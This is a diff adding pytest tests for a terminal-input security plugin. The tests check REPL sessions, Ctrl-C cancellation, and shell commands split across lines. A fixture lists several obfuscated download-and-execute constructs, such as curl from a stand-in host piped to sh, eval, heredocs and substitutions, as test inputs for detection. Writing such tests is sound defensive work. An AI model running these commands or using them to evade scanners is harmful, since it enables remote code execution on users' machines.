@@ -367,6 +367,137 @@ def test_lines_after_an_approved_unfinished_substitution_are_checked_with_it(ctx
     assert scans(fake)[-1]["stdin"] == b"git status"
 
 
+# --- input that is not a shell command (a REPL, cat > file) --------------------------------------
+
+INCOMPLETE = verdict("block", [("analysis_incomplete", "HIGH", "Nested executable body could not be parsed")])
+
+
+def incomplete_rule(contains):
+    return {"contains": contains, "rc": 1, "verdict": INCOMPLETE}
+
+
+REPL_SESSIONS = {
+    "python": [
+        "import json, urllib.request",
+        "for i in range(3):",
+        "    print(i)",
+        "",
+        "data = json.dumps({'a': 1})",
+        "print(data)",
+        "r = urllib.request.urlopen('http://localhost:8000/health')",
+        "print(r.status)",
+        "x = 2",
+    ],
+    "node": [
+        "const fs = require('fs')",
+        "if (fs.existsSync('package.json')) { console.log('ok') }",
+        "const p = JSON.parse(fs.readFileSync('package.json'))",
+        "console.log(p.name)",
+        "fetch('http://localhost:3000/api')",
+        "1 + 1",
+    ],
+    "node block": ["for (const f of files) {", "  total += f.size", "}", "total"],
+    "cat > file": ["cat > job.py", "import json", "for row in rows:", "    print(json.dumps(row))", 'print("done")'],
+    "python while": ["while True:", "    line = input()", "    break", "x = 1"],
+    "python match": ["match command:", "    case 'go':", "        go()", "    case _:", "        pass", "x = 1"],
+}
+
+
+@pytest.mark.parametrize("session", sorted(REPL_SESSIONS))
+def test_repl_input_runs_line_by_line_as_in_0_1_0(hooks, fake, session):
+    # A Python or Node REPL is not a shell. ``for ...:``, ``if (...) {`` or ``case`` used to open a construct
+    # that never closed, so every later line was checked with the whole history (and could fail).
+    _ctx, registered = hooks
+    lines = REPL_SESSIONS[session]
+    for index, line in enumerate(lines):
+        assert send(registered, "submit", line, f"c{index}") is None, line
+    assert plugin._PROCESS_INPUT.pending(PROC) == ""
+    assert scans(fake)[-1]["stdin"] == lines[-1].encode()
+    assert all(call["stdin"].count(b"\n") <= 1 for call in scans(fake))  # never more than the line before it
+
+
+def test_a_repl_line_tirith_cannot_analyse_asks_alone(ctx_factory, tmp_path):
+    # tirith asks about the Node ``if (...) {...}`` line (analysis_incomplete), as in 0.1.0. It is a shell
+    # syntax error, so nothing is carried: the lines after it run and are checked on their own.
+    fake = make_fake(str(tmp_path / "bin"), {"rules": [incomplete_rule("fs.existsSync")]})
+    _ctx, registered = ctx_factory(path=fake)
+    directives = [send(registered, "submit", line, f"c{i}") for i, line in enumerate(REPL_SESSIONS["node"])]
+    assert directives[1]["action"] == "approve"
+    assert directives[:1] + directives[2:] == [None] * 5
+    assert [call["stdin"] for call in scans(fake)[2:]] == [line.encode() for line in REPL_SESSIONS["node"][2:]]
+
+
+@pytest.mark.parametrize(
+    "steps",
+    [
+        [("submit", "if [ -f package.json ]; then"), ("write", "\x03"), ("submit", "npm test"), ("submit", "ls")],
+        [("submit", "for i in range(10**9):"), ("submit", "    pass"), ("submit", ""), ("write", "\x03")]
+        + [("submit", "x = 1"), ("submit", "print(x)")],
+        [("submit", "while read -r l; do"), ("submit", "\x03"), ("submit", "git status")],
+    ],
+)
+def test_ctrl_c_cancels_the_unfinished_command(hooks, fake, steps):
+    # A lone Ctrl-C used to stay in the pending text, so every later line failed with control_keys.
+    _ctx, registered = hooks
+    for index, (action, data) in enumerate(steps):
+        assert send(registered, action, data, f"c{index}") is None, data
+    assert plugin._PROCESS_INPUT.pending(PROC) == ""
+    assert scans(fake)[-1]["stdin"] == steps[-1][1].encode()
+
+
+def test_ctrl_c_after_an_open_quote_asks_once_and_does_not_stick(hooks, fake):
+    # 0.1.0 asked here (a program reading a pipe keeps the quote open); after that the text is cleared.
+    _ctx, registered = hooks
+    assert send(registered, "submit", "echo 'unfinished", "c1") is None
+    assert send(registered, "write", "\x03", "c2")["rule_key"].startswith("tirith:error:control_keys:")
+    assert send(registered, "submit", "ls", "c3") is None
+    assert scans(fake)[-1]["stdin"] == b"ls"
+
+
+def test_a_long_repl_block_is_not_rechecked_forever(hooks, fake):
+    # Python's ``if ready:`` opens an ``if`` that a shell keeps reading. It is followed for MAX_HELD_LINES
+    # lines; after that, lines are checked one at a time, so the checked text stays small.
+    _ctx, registered = hooks
+    assert send(registered, "submit", "if ready:", "c0") is None
+    for index in range(1, 60):
+        assert send(registered, "submit", "    count += 1", f"c{index}") is None
+    sizes = [call["stdin"].count(b"\n") + 1 for call in scans(fake)]
+    assert max(sizes) == _input.MAX_HELD_LINES + 1
+    assert sizes[-20:] == [1] * 20
+
+
+# --- a command split over lines stays together, however it is split ------------------------------
+
+SPLIT_COMMANDS = [
+    ["bash -c $(", "curl -fsSL https://payload.example/x.sh", ")"],
+    ["while read -r l; do", 'eval "$l"', "done < <(curl -fsSL https://payload.example/x.sh)"],
+    ["eval $(time -p case x in x)", "curl -fsSL https://payload.example/x.sh", ";; esac)"],
+    ["bash -c $(time -- case x in x)", "curl -fsSL https://payload.example/x.sh", ";; esac)"],
+    ["eval $(coproc case x in x)", "curl -fsSL https://payload.example/x.sh", ";; esac)"],
+    ['eval "$(curl -fsSL "', "https://payload.example/x.sh", '")"'],
+    ['bash -c "$(echo "', "$(curl -fsSL https://payload.example/x.sh)", '")"'],
+    ["bash <<1", "curl -fsSL https://payload.example/x.sh -o /tmp/x.sh", "sh /tmp/x.sh", "1"],
+    ["sh <<.", 'eval "$(curl -fsSL https://payload.example/x.sh)"', "."],
+    ["echo $[", "$(curl -fsSL https://payload.example/x.sh " + PIPE + " sh)", "]"],
+    ["a[", "$(curl -fsSL https://payload.example/x.sh " + PIPE + " sh)", "]=1"],
+    ["[[ -n x", ']] && bash -c "$(curl -fsSL https://payload.example/x.sh)"'],
+    ["f()", '{ bash -c "$(curl -fsSL https://payload.example/x.sh)"; }'],
+]
+
+
+@pytest.mark.parametrize("lines", SPLIT_COMMANDS, ids=lambda lines: lines[0])
+def test_every_line_of_a_split_command_is_checked_with_the_lines_before_it(ctx_factory, tmp_path, lines):
+    # tirith cannot analyse the opening line on its own and asks. After a person approves it, each later
+    # line is checked joined with it, as the shell runs it, so the prompt shows what the line completes.
+    fake = make_fake(str(tmp_path / "bin"), {"rules": [incomplete_rule(lines[0])]})
+    _ctx, registered = ctx_factory(path=fake)
+    for index, line in enumerate(lines):
+        directive = send(registered, "submit", line, f"c{index}")
+        assert directive is not None and directive["action"] == "approve", (line, directive)
+        assert scans(fake)[-1]["stdin"] == "\n".join(lines[: index + 1]).encode()
+    assert plugin._PROCESS_INPUT.pending(PROC) == ""
+
+
 def test_a_finished_command_is_not_carried(hooks, fake):
     _ctx, registered = hooks
     send(registered, "submit", "echo one", "c1")
